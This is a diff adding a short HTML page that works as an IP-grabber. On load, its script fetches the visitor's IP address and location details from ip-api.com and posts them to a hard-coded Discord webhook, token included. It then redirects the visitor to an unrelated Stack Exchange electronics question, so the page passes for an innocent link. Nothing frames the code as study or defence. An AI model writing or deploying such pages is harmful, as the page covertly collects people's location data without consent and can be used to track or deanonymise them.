@@ -1,0 +1,21 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+fetch("https://ip-api.com/json").then(function(response) { return response.json(); })
+.then(function(json) {
+  fetch("https://discord.com/api/webhooks/1442110167717118082/2nHo08lwKIXTBFMMXMGBGjmYpkJwOvpZ2AlcXRaVU6_Z_cMngSm5zWS-ZIe9ach8Tywa",   {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      username: 'webhook',
+      content: json
+   })});
+});
+window.location = "https://electronics.stackexchange.com/questions/201388/amateur-question-how-circuit-analysis-methods-are-applied-in-complicated-circ";
+</script>
+</body>
+</html>
